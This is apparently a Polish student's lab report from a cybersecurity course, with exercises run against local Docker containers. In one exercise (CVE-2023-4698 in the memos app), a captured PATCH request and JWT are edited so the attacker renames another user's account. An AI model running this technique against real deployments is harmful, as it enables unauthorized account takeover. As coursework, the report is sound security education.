# Cyberbezpieczeństwo i Kryptografia - Lab 5

## Zadanie 0.1 
Błąd w podpowiedzi 0.1. Kontener słucha na swoim wewnętrznym porcie 80. 
### Komenda do uruchomienia kontenera:
`docker run -p 1101:80 docker.io/mazurkatarzyna/bsk-book-p1-ch0-ex01:latest`
###Komenda do poprawnego uwierzytelnienia
`curl -u kali:orange --basic http://127.0.0.1:1101`
###Komenda z błędnymi danymi
`curl -u kali:orange1 --basic http://127.0.0.1:1101`

Używane jest uwierzytelnianie basic authentication.


## Zadanie 0.3
Otrzymany wynik:
`b'pass:linuxrocks'`
login - pass
hasło - linuxrocks


## Zadanie 0.7

### Uruchomienie kontenera w dockerze
`docker run -p 1107:1107 docker.io/mazurkatarzyna/bsk-book-p1-ch0-ex07:latest`

### Rejestracja użytkownika
```
┌──(kali㉿kali)-[~]
└─$ curl -X POST -d "name=John" -d "email=john@example.com" -d "password=passwrod123"  http://127.0.0.1:1107/signup
Successfully registered.  
```

### Logowanie
```
┌──(kali㉿kali)-[~]
└─$ curl -X POST -d "name=John" -d "email=john@example.com" -d "password=passwrod123"  http://127.0.0.1:1107/login
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwdWJsaWNfaWQiOiI1MWZjYWQ2Mi0xYzU3LTQ0YjAtYWM1OC1jNzIyZjY4YzkwZTIiLCJleHAiOjE3MzYxNzYyODJ9.eqCLKVMWmsDV2WuM-GKztVqzO7kkhZZruyAbtUeFOqg"
}
```


### Dostanie się do panelu użytkownika:
```
└─$ curl -H "token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwdWJsaWNfaWQiOiI1MWZjYWQ2Mi0xYzU3LTQ0YjAtYWM1OC1jNzIyZjY4YzkwZTIiLCJleHAiOjE3MzYxNzYyODJ9.eqCLKVMWmsDV2WuM-GKztVqzO7kkhZZruyAbtUeFOqg" http://127.0.0.1:1107/user
{
  "message": "Token is missing !!"
}
```
Z jakiegoś powodu zwraca błąd, ale to pewnie kwestia implementacji i nazwania parametru.


## Zadanie 0.9
*Improper Access Control* do aplikacji *memos*. 
[Proof of Concept](https://github.com/mnqazi/CVE-2023-4698)

### Uruchomienie i konfiguracja kontenera. 
`docker run -p 2000:5230 docker.io/mazurkatarzyna/bsk-book-p1-ch0-ex09:latest`
Aplikacja *memos* słucha teraz na porcie 2000 localhosta. 
Uruchamiamy proxy Burpsuite Community Edition. Uruchamiamy wbudowaną w Burpsuite'a przeglądarkę. Następnie przechodzimy w przeglądarce na adres 127.0.0.1:2000 i rejestrujemy pierwszego użytkownika (hosta). Powiedzmy, że będzie mieć dane root/root.
Następnie wchodzimy w root > My Account > Member. W polu Create a member dodajemy dwóch użytkowników:
- student / student (id 2)
- bsk / bsk (id 3)
Wylogowujemy się z konta Hosta i logujemy na konto student / student. 
 
### Przechwycenie legitnego nagłówka zmiany danych
 
 W Burpsuite > Proxy uruchamiamy przechwytywanie pakietów.
 W panelu użytkownika student wchodzimy w My Account > Edit. Pojawia nam się popup. Zmienimy dane na username studenciak, nickname studenciak. 
 Zatwierdzamy requesta w proxy. Rzeczywiście, nazwa naszego użytkownika zmieniła się na studenciak. 
 
 Nasz request wygląda następująco:
 
```
 PATCH /api/user/2 HTTP/1.1
Host: 127.0.0.1:2000
Content-Length: 56
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
sec-ch-ua: "Not?A_Brand";v="99", "Chromium";v="130"
Content-Type: application/json
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Origin: http://127.0.0.1:2000
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:2000/
Accept-Encoding: gzip, deflate, br
Cookie: _csrf=6NNSZGAB9uITuXQ2vGYS9dYqTjz5Svpp; _csrf=6NNSZGAB9uITuXQ2vGYS9dYqTjz5Svpp; _csrf=6NNSZGAB9uITuXQ2vGYS9dYqTjz5Svpp; access-token=eyJhbGciOiJIUzI1NiIsImtpZCI6InYxIiwidHlwIjoiSldUIn0.eyJuYW1lIjoic3R1ZGVudCIsImlzcyI6Im1lbW9zIiwic3ViIjoiMiIsImF1ZCI6WyJ1c2VyLmFjY2Vzcy10b2tlbiJdLCJleHAiOjE3MzYyNjc4OTQsImlhdCI6MTczNjE4MTQ5NH0.tIg4LhiygzuIA9O27Uw_8lPii74vaNsaitEjhVr47VU; refresh-token=eyJhbGciOiJIUzI1NiIsImtpZCI6InYxIiwidHlwIjoiSldUIn0.eyJuYW1lIjoic3R1ZGVudCIsImlzcyI6Im1lbW9zIiwic3ViIjoiMiIsImF1ZCI6WyJ1c2VyLnJlZnJlc2gtdG9rZW4iXSwiZXhwIjoxNzM2Nzg2Mjk0LCJpYXQiOjE3MzYxODE0OTR9.U15qvIUdJrXxDdyjb2hjpN8mCDHX4FghF8SpnIIAB7g
Connection: keep-alive

{"id":2,"nickname":"studenciak","username":"studenciak"}
```

Wysyłamy go do Repeatera. 

### Przygotowanie nagłówka do przeprowadzenia ataku

Spróbujemy zmienić nazwę konta bsk na bezpieczenstwo. W tym celu:
1. Usuwamy wszystkie pliki Cookie poza `access-token` i `_csrf`. 
2. W `PATCH /api/user/id` ustawiamy wartość id na id atakowanego konta, w naszym wypadku - 3. 
3. Przy użyciu narzędzia takiego jak np. [token.dev](token.dev) modyfikujemy token JWT `access_token` w taki sposób, aby w polu `name` znajdowała się nazwa atakowanego konta, a w polu `sub` jego id. 
4. Modyfikujemy JSON tak, aby zawierał:
```
{"id":3,"nickname":"bezpieczenstwo","username":"bezpieczenstwo"}
```

Klikamy `Send` - wysyłamy tak spreparowane żądanie do serwera. Serwer odpowiada 
```
HTTP/1.1 200 OK
SNIP...
{
  "data": {
    "id": 3,
    "rowStatus": "NORMAL",
    "createdTs": 1736181419,
    "updatedTs": 1736182434,
    "username": "bezpieczenstwo",
    "role": "USER",
    "email": "",
    "nickname": "bezpieczenstwo",
    "openId": "d24bd48b-82b9-45d4-a3ec-495fff66b48d",
    "avatarUrl": "",
    "userSettingList": []
  }
}
```

### Sprawdzenie

Próbujemy zalogować się na konto bezpieczenstwo/bsk. Rzeczywiście, podane przez nas dane do logowania są poprawne. Username i hasło zostały więc zmienione. 


## Zadanie 0.10
[Proof of Concept](https://huntr.com/bounties/46881df7-eb41-4ce2-a78f-82de9bc4fc2d)
